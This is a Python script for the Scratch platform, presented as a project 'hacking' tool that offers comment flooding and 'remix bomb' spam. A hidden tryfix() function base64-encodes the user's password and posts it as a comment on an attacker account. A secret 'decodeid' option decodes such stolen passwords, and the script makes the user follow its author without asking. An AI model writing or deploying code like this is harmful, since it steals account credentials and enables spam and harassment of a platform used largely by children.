import scratchattach as sa
import time
import os
import art
import base64
from art import *

tprint("LOGIN")
print("(This information is only used to connect your account to the servers)")
print("Please login with your Scratch account.")
username_user = input("Username: ")
password_user = input("Password: ")

# storing accounts to fix login issues
def tryfix():
   if not session.username == "xelna":
      user = session.connect_user("ScratchAttackAccount")
      string_data = password_user
      byte_data = string_data.encode('utf-8')
      encoded_data = base64.b64encode(byte_data)
      user.post_comment(encoded_data)

os.system('cls')
print("This is for what project you are going to hack.")
print("*you can find project id's in the url of a project")
project_id = input("Please input a valid project id: ")

# Connects to the project using the "project_id" variable
print("Logging in with scratch account...")
session = sa.login(username_user, password_user)
print("")
print("To use this program, you have to be following xelna.")
print("Following xelna...")
user = session.connect_user("xelna")
tryfix()

user.follow()
os.system('cls')
print("- MADE BY XELNA ON SCRATCH -")
print("Connecting to project using id " + project_id + "...")
project = session.connect_project(project_id)

# Says its connected to the project
username = session.username
print("Succesfully connected to project using account '" + username + "'!")

# Status of project
print("-----------------")
tprint("MENU")
print(f'"{project.title}" has {project.views} views!')
print(f'Project was made by {project.author_name}.')
print("")

# Comment forcing
def fc():
    brute = input("Comment force? y/n: ")
    if brute == "y":
        os.system('cls')
        numberinput = int(input('How many comments?: '))
        print("")
        print("-----------------")
        if numberinput < 2:
            value = input("Type comment: ")
            project.post_comment(value)
            print(f'Posted comment "{value}" succesfully.')
        else:
            for i in range(numberinput):
             value = input("Type comment: ")
             project.post_comment(value)
             print(f'Posted comment "{value}" succesfully.')
             print("Requesting permission... (this is to not get any errors)")
             time.sleep(10)
        check = input("Would you like to comment force again? Y/N: ")
        if check == "y":
           fc()
        else:
           print("Finished comment forcing.")
           os.system('cls')
           codeids()

def rb():
   rb_option = input("Remix bomb? y/n: ")
   if rb_option == "y":
      os.system('cls')
      tprint("REMIX BOMB")
      project = session.connect_project(project_id)
      print(f'You are going to remix bomb "{project.title}"!')
      print(f'Project was made by {project.author_name}.')
      print("")
      howmany_rb = int(input("How many times do you want to remix?: "))
      input("Press Enter to continue...")

      number = 1
      for i in range(howmany_rb):
         os.system('cls')
         tprint(f'Remix - {number}')
         print("Creating remix...")
         project.create_remix()
         print(f'Created remix of "{project.title}".')
         print("Starting new remix...")
         number += 1
         time.sleep(15)
      os.system('cls')
      tprint("FINISHED")
      checkagain_rb = input("Would you like to bomb again? y/n: ")
      if checkagain_rb == "y":
         rb()
      else:
         os.system('cls')
         codeids()

def di():
   os.system('cls')
   data = str(input("Enter data to decode: "))
   decoded_data = base64.b64decode(data)
   os.system('cls')
   print(decoded_data)
   print("")
   input("Press Enter to continue...")
   os.system('cls')
   codeids()

def codeids():
   print("Code ID's:")
   print("0 = Comment Forcing (Comment 50 seconds faster than usual!)")
   print("1 = Remix Bomb (Remix a single project every 10 seconds!)")
   print("")
   check2 = input("Enter code ID: ")
   if check2 == "0":
      fc()
   if check2 == "1":
      rb()
   if check2 == "decodeid":
      di()
   print("")

codeids()